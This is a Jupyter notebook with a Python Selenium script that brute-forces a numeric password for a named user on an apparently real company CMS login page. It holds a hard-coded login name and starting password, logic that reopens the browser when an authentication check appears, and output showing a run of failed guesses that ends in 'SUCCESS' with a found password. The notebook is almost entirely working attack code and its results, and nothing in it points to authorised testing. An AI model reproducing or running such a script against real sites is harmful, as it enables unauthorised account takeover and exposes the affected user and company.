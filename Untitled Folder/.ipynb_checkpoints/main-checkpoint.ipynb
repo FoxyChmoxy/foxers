{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Modules loaded successfully\n"
     ]
    }
   ],
   "source": [
    "from bs4 import BeautifulSoup\n",
    "from random import choice\n",
    "from fake_useragent import UserAgent\n",
    "\n",
    "from selenium import webdriver\n",
    "import csv\n",
    "import time\n",
    "import os\n",
    "import wget\n",
    "import requests\n",
    "\n",
    "print(\"Modules loaded successfully\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "login = \"Ернар\"\n",
    "password = 953682\n",
    "login_url = \"https://cms.sulpak.kz/Account/Login?ReturnUrl=%2F\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [],
   "source": [
    "def check(driver):\n",
    "    try:\n",
    "        label = driver.find_element_by_xpath('/html/body/div/div/div[2]/form/h1').text\n",
    "        if label == \"Проверка подлинности\":\n",
    "            return True\n",
    "        return False\n",
    "    except:\n",
    "        return False\n",
    "\n",
    "def reopen():\n",
    "    driver = webdriver.Chrome()\n",
    "    driver.get(login_url)\n",
    "\n",
    "    login_input = driver.find_element_by_xpath('//*[@id=\"Login\"]')\n",
    "    password_input = driver.find_element_by_xpath('//*[@id=\"Password\"]')\n",
    "    button = driver.find_element_by_xpath('//*[@id=\"btnSignIn\"]')\n",
    "    \n",
    "    return driver, login_input, password_input, button"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Вход в систему\n",
      "Login: Ернар\n",
      "Password: 853682\n",
      "Неправильный логин или пароль\n",
      "-----------------\n",
      "Вход в систему\n",
      "Login: Ернар\n",
      "Password: 853683\n",
      "Неправильный логин или пароль\n",
      "-----------------\n",
      "Вход в систему\n",
      "Login: Ернар\n",
      "Password: 853684\n",
      "Неправильный логин или пароль\n",
      "-----------------\n",
      "Вход в систему\n",
      "Login: Ернар\n",
      "Password: 853685\n",
      "Неправильный логин или пароль\n",
      "-----------------\n",
      "Вход в систему\n",
      "Login: Ернар\n",
      "Password: 853686\n",
      "Неправильный логин или пароль\n",
      "-----------------\n",
      "Вход в систему\n",
      "Login: Ернар\n",
      "Password: 853687\n",
      "Неправильный логин или пароль\n",
      "-----------------\n",
      "Вход в систему\n",
      "Login: Ернар\n",
      "Password: 853688\n",
      "Неправильный логин или пароль\n",
      "-----------------\n",
      "Вход в систему\n",
      "Login: Ернар\n",
      "Password: 853689\n",
      "Неправильный логин или пароль\n",
      "-----------------\n",
      "Вход в систему\n",
      "Login: Ернар\n",
      "Password: 853690\n",
      "Неправильный логин или пароль\n",
      "-----------------\n",
      "Вход в систему\n",
      "SUCCESS\n",
      "Login: Ернар\n",
      "Password: 853691\n"
     ]
    }
   ],
   "source": [
    "driver, login_input, password_input, button = reopen()\n",
    "login_input.send_keys(login)\n",
    "\n",
    "t = password-100000\n",
    "while t != password:    \n",
    "    password_input.clear()\n",
    "    password_input.send_keys(t)\n",
    "\n",
    "    button.click()\n",
    "    \n",
    "    if(check(driver)):\n",
    "        driver.close()\n",
    "        driver, login_input, password_input, button = reopen()\n",
    "        login_input.send_keys(login)\n",
    "\n",
    "    time.sleep(2)\n",
    "    try:\n",
    "        label = driver.find_element_by_xpath('//*[@id=\"lblSignInResult\"]')\n",
    "        print(f\"Login: {login}\")\n",
    "        print(f\"Password: {t}\")\n",
    "        print(label.text)\n",
    "        print(\"-----------------\")\n",
    "        t+=1\n",
    "    except:    \n",
    "        print(\"SUCCESS\")\n",
    "        print(f\"Login: {login}\")\n",
    "        print(f\"Password: {t}\")\n",
    "        break"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
